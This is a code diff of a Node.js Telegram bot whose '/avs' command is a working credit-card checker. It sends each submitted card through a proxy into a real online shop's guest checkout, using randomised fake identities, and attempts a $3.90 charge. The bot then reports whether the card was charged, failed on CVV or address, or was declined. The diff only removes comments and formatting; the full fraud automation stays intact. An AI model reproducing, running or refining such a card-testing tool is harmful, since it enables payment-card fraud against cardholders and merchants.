@@ -10,7 +10,6 @@ const bot = new TelegramBot(token, { polling: true });
 const app = express();
 app.use(express.json());
 
-// Proxy Configuration
 const proxyConfig = {
     host: 'us-east.gw.rayobyte.com',
     port: 8000,
@@ -20,7 +19,6 @@ const proxyConfig = {
     }
 };
 
-// Random Generators
 const firstNames = ['Shawn', 'James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard'];
 const lastNames = ['PHKHKKFG', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis'];
 const addresses = [
@@ -45,7 +43,7 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
         ano = ano.slice(2);
     }
 
-    bot.sendMessage(chatId, `🔍 **Tinitingnan ang card:** \`${lista}\` ...`, { parse_mode: 'Markdown' });
+    bot.sendMessage(chatId, `Tinitingnan ang card: ${lista} ...`);
 
     try {
         const jar = new CookieJar();
@@ -58,7 +56,6 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
 
         const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36';
         
-        // IP check
         let ip = 'Unknown';
         try {
             const ipRes = await client.get('https://api64.ipify.org/?format=json');
@@ -71,7 +68,6 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
         const remail = `shawn${Math.floor(Math.random() * 900 + 100)}@gmail.com`;
         const rphone = '971' + Math.floor(Math.random() * 900 + 100) + Math.floor(Math.random() * 9000 + 1000);
 
-        // 1. Add to Cart
         await client.post('https://fireflyfuel.com/cart/add-item.ajax/id/325', 'skuId=925&quantity=1', {
             headers: {
                 'content-type': 'application/x-www-form-urlencoded',
@@ -82,12 +78,10 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
             }
         });
 
-        // 2. Checkout GET
         await client.get('https://fireflyfuel.com/checkout', {
             headers: { 'referer': 'https://fireflyfuel.com/shop/dropper', 'user-agent': ua }
         });
 
-        // 3. Guest Post
         await client.post('https://fireflyfuel.com/checkout', `type=guest&guestEmail=${encodeURIComponent(remail)}&offers=1`, {
             headers: {
                 'content-type': 'application/x-www-form-urlencoded',
@@ -97,7 +91,6 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
             }
         });
 
-        // 4. Checkout Info POST (Shipping/Billing)
         const infoData = new URLSearchParams({
             'shipping[country]': 'US',
             'shipping[US][firstName]': rfname,
@@ -131,12 +124,10 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
             }
         });
 
-        // 5. Payment Page GET
         await client.get('https://fireflyfuel.com/checkout/payment', {
             headers: { 'referer': 'https://fireflyfuel.com/checkout/info', 'user-agent': ua }
         });
 
-        // 6. Run Payment AJAX
         const paymentData = new URLSearchParams({
             'x_amount': '3.90',
             'x_order_id': '',
@@ -178,22 +169,22 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
         
         let msgResult = respData.messages ? respData.messages.replace(/<[^>]*>?/gm, '').trim() : JSON.stringify(respData);
 
-        let finalResponse = `💳 **Card:** \`${lista}\`\n`;
+        let finalResponse = `Card: ${lista}\n`;
         if (respData.result === 'success') {
-            finalResponse += `🟢 **STATUS: CHARGED ($3.90)**\n🆔 **Order ID:** ${respData.order_id || 'N/A'}\n`;
+            finalResponse += `STATUS: CHARGED ($3.90)\nOrder ID: ${respData.order_id || 'N/A'}\n`;
         } else if (msgResult.includes('Address provided does not match')) {
-            finalResponse += `🟡 **STATUS: CVV / Address Mismatch**\n`;
+            finalResponse += `STATUS: CVV / Address Mismatch\n`;
         } else if (msgResult.includes('Invalid CVV') || msgResult.includes('Insufficient funds')) {
-            finalResponse += `🟡 **STATUS: CCN (${msgResult})**\n`;
+            finalResponse += `STATUS: CCN (${msgResult})\n`;
         } else {
-            finalResponse += `🔴 **STATUS: DECLINED**\n💬 **Reason:** ${msgResult}\n`;
+            finalResponse += `STATUS: DECLINED\nReason: ${msgResult}\n`;
         }
-        finalResponse += `⏱ **T:** ${endTime}s | 🌐 **IP:** ${ip}`;
+        finalResponse += `Time: ${endTime}s | IP: ${ip}`;
 
-        bot.sendMessage(chatId, finalResponse, { parse_mode: 'Markdown' });
+        bot.sendMessage(chatId, finalResponse);
 
     } catch (error) {
-        bot.sendMessage(chatId, `❌ **Error:** ${error.message}`, { parse_mode: 'Markdown' });
+        bot.sendMessage(chatId, `Error: ${error.message}`);
     }
 });
 
